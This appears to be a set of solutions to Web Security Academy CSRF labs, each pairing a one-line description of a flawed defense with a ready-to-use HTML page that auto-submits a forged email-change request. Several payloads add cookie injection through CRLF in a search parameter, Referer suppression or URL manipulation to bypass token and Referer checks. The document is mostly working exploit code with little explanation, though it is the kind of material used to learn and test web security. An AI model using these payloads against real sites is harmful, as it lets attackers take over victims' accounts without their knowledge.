# CSRF

## CSRF vulnerability with no defenses
```html
<html>
  <body>
    <form action="https://ac711fd11f4a145080cf065d007d0000.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF where token validation depends on request method
*Some applications correctly validate the token when the request uses the POST method but skip the validation when the GET method is used.*
```html
<html>
  <body>
    <form action="https://ac821f841ea7fc638025526d00e80028.web-security-academy.net/email/change" method="GET">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## Validation of CSRF token depends on token being present
*Some applications correctly validate the token when it is present but skip the validation if the token is omitted.*
```html
<html>
  <body>
    <form action="https://ac4a1f6c1e26373580a1293100d10042.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF where token is not tied to user session
*Some applications do not validate that the token belongs to the same session as the user who is making the request.
Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.*
```html
<html>
  <body>
    <form action="https://ac951fd61fbca61f80cd57e100bf002d.web-security-academy.net/email/change" method="POST">
      <!-- Attacker's token -->
      <input required type="hidden" name="csrf" value="nvYjyCnkZg9lxPdk0jUwfsYsM7IGqZP5">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
```

## CSRF where token is tied to non-session cookie
*In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the
same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks,
one for session handling and one for CSRF protection, which are not integrated together.*
```html
<!-- Cookie csrfKey works as session ID here. It's app weakness. -->
<html>
  <body>
    <form action="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/email/change" method="POST">
      <!-- Attacker's token -->
      <input required type="hidden" name="csrf" value="nwA4aBrVat0amHXA9Z6nfo8coPU8JhWK"/>
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <!-- Vulnerability which allows an attacker to inject a cookie to victim.  -->
    <img src="https://acd41f251facd65c80122553008d00c5.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrfKey=kE4no0fY9JeJvK9KSGzoZrIYZ7PTubzQ" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF where token is duplicated in cookie
*In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of
tokens that have been issued, but instead duplicate each token within a cookie and a request parameter.
When the subsequent request is validated, the application simply verifies that the token submitted in the
request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defense
against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state.*
```html
<html>
  <body>
    <form action="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/email/change" method="POST">
      <input required type="hidden" name="csrf" value="myCsrfToken"/>
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <!-- Vulnerability which allows an attacker to inject a cookie to victim. -->
    <img src="https://ac251fc31f9c6869805c480f00090062.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=myCsrfToken" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF where Referer validation depends on header being present
*Some applications validate the Referer header when it is present in requests but skip the validation if the header is omitted.*
```html
<html>
  <head>
    <meta name="referrer" content="never">
  </head>
  <body>
    <form action="https://ac341ff21e634bca80a3b4fa00840005.web-security-academy.net/email/change" method="POST">
      <input required type="hidden" name="csrf" value="myCsrfToken"/>
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <img src="1" onerror="document.forms[0].submit()">
  </body>
</html>
```

## CSRF with broken Referer validation
*Some applications validate the Referer header in a naive way that can be bypassed. For example, if the application
simply validates that the Referer contains its own domain name, then the attacker can place the required value
elsewhere in the URL.*
```html
<html>
  <body>
    <form action="https://ac5b1f021ef24bb18010b59d00cf0004.web-security-academy.net/email/change" method="POST">
      <input type="hidden" name="email" value="pwned@evil-user.net" />
    </form>
    <script>
      history.pushState("", "", "/ac5b1f021ef24bb18010b59d00cf0004.web-security-academy.net")
      document.forms[0].submit();
    </script>
  </body>
</html>
```